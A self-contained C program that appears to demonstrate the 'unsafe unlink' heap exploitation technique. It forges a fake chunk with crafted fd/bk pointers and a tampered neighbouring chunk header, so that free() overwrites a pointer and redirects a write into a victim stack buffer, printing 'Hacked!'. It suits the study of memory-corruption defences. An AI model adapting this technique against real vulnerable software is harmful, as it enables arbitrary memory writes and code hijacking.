#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef long long LONG;
const LONG SIZE = 0x100;

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
};

int main()
{
	char data[100] = "Victim's data";
	void *first = malloc(SIZE);
	void *second = malloc(SIZE);
	printf("first:      %p\n", first);
	printf("second:     %p\n", second);

	struct Chunk *fake = (struct Chunk *)first;
	fake->fd = (struct Chunk *)((&first) - 3);
	fake->bk = (struct Chunk *)((&first) - 2);
	printf("fake:       %p\n", fake);
	printf("&first      %p\n", (struct Chunk *)(&first));
	printf("fake->fd    %p\n", fake->fd);
	printf("fake->bk    %p\n", fake->bk);

	struct Chunk *fakeHeader = (struct Chunk *)(second - 2*8);
	fakeHeader->pre_size = SIZE;
	fakeHeader->size >>= 1;
	fakeHeader->size <<= 1;
	printf("fakeHeader: %p\n", fakeHeader);

	free(second);
	*(LONG *)(first + 3*8) = (LONG)&data;
	
	*(LONG *)first = 0x0a2164656b636148; // hex of "Hacked!\n"

	write(1, (char *)data, 8);
}
